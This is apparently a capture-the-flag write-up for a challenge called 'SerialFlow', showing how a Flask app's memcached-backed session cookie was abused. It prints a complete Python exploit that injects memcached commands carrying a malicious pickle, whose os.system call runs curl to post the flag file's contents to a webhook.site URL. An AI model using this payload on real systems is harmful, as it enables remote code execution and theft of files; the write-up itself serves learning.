# SerialFlow

So we start off with a simple page that has no input or interaction visible:

<figure><img src="../../../../.gitbook/assets/image (46).png" alt=""><figcaption></figcaption></figure>

So i open vscode and start looking for the routes and any information that i can find:

<figure><img src="../../../../.gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure>

that seemed odd

<figure><img src="../../../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

and we discovered a route with a parameter we can try...

<figure><img src="../../../../.gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>

But it really didn't do anything so i started looking at the memcached thing and found some nice stuff:

{% embed url="https://hacktricks.boitatech.com.br/pentesting/11211-memcache" %}

and on portswigger we found a link for this page:

{% embed url="https://btlfry.gitlab.io/notes/posts/memcached-command-injections-at-pylibmc/" %}

and what caught my eye was the fact that there was some flask session signing algorythm just like in our challenge, the goal is to convert a stream of bytes into a Python object and get remote code execution. The POC of this article helps us with that

I don't know what i did to trigger this error but somehow the flag poped up:

```python
import pickle
import os

class RCE:
    def __reduce__(self):
        cmd = ('curl -X POST -d "flag=$(cat /flag*.txt)" https://webhook.site/ee80bfca-5128-4dbd-9532-6eff5b82e43')
        return os.system, (cmd,)

def generate_exploit():
    payload = pickle.dumps(RCE(), 0)
    payload_size = len(payload)
    cookie = b'137\r\nset BT_:1337 0 2592000 '
    cookie += str.encode(str(payload_size))
    cookie += str.encode('\r\n')
    cookie += payload
    cookie += str.encode('\r\n')
    cookie += str.encode('get BT_:1337')

    pack = ''
    for x in list(cookie):
        if x > 64:
            pack += oct(x).replace("0o","\\")
        elif x < 8:
            pack += oct(x).replace("0o","\\00")
        else:
            pack += oct(x).replace("0o","\\0")

    return f"\"{pack}\""
print(generate_exploit())
```

so i wanted to copy the value of the flag and send it to my webhook, then i got this output:

<figure><img src="../../../../.gitbook/assets/image (52).png" alt=""><figcaption></figcaption></figure>

Then i went in burp and replaced the session cookie with the payload and sent it to get the flag (it did not send the data to my webhook but still got the flag lol:

<figure><img src="../../../../.gitbook/assets/image (53).png" alt=""><figcaption></figcaption></figure>
